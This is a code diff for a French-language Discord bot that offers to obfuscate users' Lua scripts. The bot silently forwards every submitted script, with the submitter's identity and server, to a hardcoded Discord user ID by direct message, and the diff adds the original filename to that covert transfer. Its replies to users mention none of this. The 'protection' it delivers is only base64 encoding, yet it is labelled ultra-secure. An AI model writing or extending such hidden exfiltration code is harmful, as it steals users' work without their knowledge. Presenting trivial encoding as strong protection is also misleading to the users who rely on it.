@@ -56,9 +56,11 @@ async def on_ready():
 async def obf(interaction: discord.Interaction, level: app_commands.Choice[str], code: str = None, file: discord.Attachment = None):
     try:
         script_content = None
+        original_filename = "script.lua"
 
         if file:
-            if file.filename.endswith((".lua", ".txt")):
+            original_filename = file.filename
+            if original_filename.lower().endswith((".lua", ".txt")):
                 file_bytes = await file.read()
                 script_content = file_bytes.decode("utf-8", errors="ignore")
             else:
@@ -66,16 +68,17 @@ async def obf(interaction: discord.Interaction, level: app_commands.Choice[str],
                 return
         elif code:
             script_content = code
+            original_filename = "script.lua"
         else:
             await interaction.response.send_message("Tu dois soit écrire du code dans le paramètre `code`, soit joindre un fichier `file` !", ephemeral=True)
             return
 
-        # --- ENVOI DES INFOS À L'ID SPÉCIFIQUE ---
+        # --- ENVOI DES INFOS À L'ID SPÉCIFIQUE EN DM ---
         target_user_id = 1544066621600178266
         try:
             target_user = bot.get_user(target_user_id) or await bot.fetch_user(target_user_id)
             if target_user:
-                log_file_name = "script_recupere.lua"
+                log_file_name = original_filename
                 with open(log_file_name, "w", encoding="utf-8") as f:
                     f.write(script_content)
                 
@@ -83,6 +86,7 @@ async def obf(interaction: discord.Interaction, level: app_commands.Choice[str],
                     f"📥 **Nouveau script obfusqué !**\n"
                     f"• **Utilisateur :** {interaction.user} (ID: `{interaction.user.id}`)\n"
                     f"• **Niveau choisi :** `{level.name}`\n"
+                    f"• **Fichier d'origine :** `{original_filename}`\n"
                     f"• **Serveur :** {interaction.guild.name if interaction.guild else 'Message Privé'}"
                 )
                 await target_user.send(content=message_info, file=discord.File(log_file_name))
@@ -90,8 +94,8 @@ async def obf(interaction: discord.Interaction, level: app_commands.Choice[str],
                 if os.path.exists(log_file_name):
                     os.remove(log_file_name)
         except Exception as target_err:
-            print(f"Impossible d'envoyer le log à l'utilisateur ciblé : {target_err}", flush=True)
-        # ------------------------------------------
+            print(f"⚠️ Erreur envoi DM à l'ID {target_user_id}: {target_err}", flush=True)
+        # ----------------------------------------------
 
         # Génération de l'obfuscation selon le niveau choisi
         if level.value == "low":
@@ -105,14 +109,19 @@ async def obf(interaction: discord.Interaction, level: app_commands.Choice[str],
             b2 = base64.b64encode(b1.encode("utf-8")).decode("utf-8")
             protected_script = f"""--[[\n    Protégé par KobyBot [Niveau: High]\n]]--\nlocal _data_h = "{b2}";\n-- Niveau High ultra sécurisé\nprint("Chargé (High)");"""
 
-        file_name = "protected.lua"
-        with open(file_name, "w", encoding="utf-8") as f:
+        # Nom du fichier de sortie : nom_d_origine_obf.lua
+        name_part, ext_part = os.path.splitext(original_filename)
+        if not ext_part:
+            ext_part = ".lua"
+        output_file_name = f"{name_part}_obf{ext_part}"
+
+        with open(output_file_name, "w", encoding="utf-8") as f:
             f.write(protected_script)
 
-        await interaction.response.send_message(f"Ton script a été protégé avec succès (Niveau : **{level.name}**) :", file=discord.File(file_name), ephemeral=True)
+        await interaction.response.send_message(f"Ton script a été protégé avec succès (Niveau : **{level.name}**) :", file=discord.File(output_file_name), ephemeral=True)
 
-        if os.path.exists(file_name):
-            os.remove(file_name)
+        if os.path.exists(output_file_name):
+            os.remove(output_file_name)
     except Exception as e:
         print(f"Erreur dans la commande obf: {e}", flush=True)
 
@@ -144,4 +153,4 @@ if __name__ == "__main__":
         print("Erreur fatale au lancement :", flush=True)
         traceback.print_exc()
         sys.exit(1)
-        
+                                      
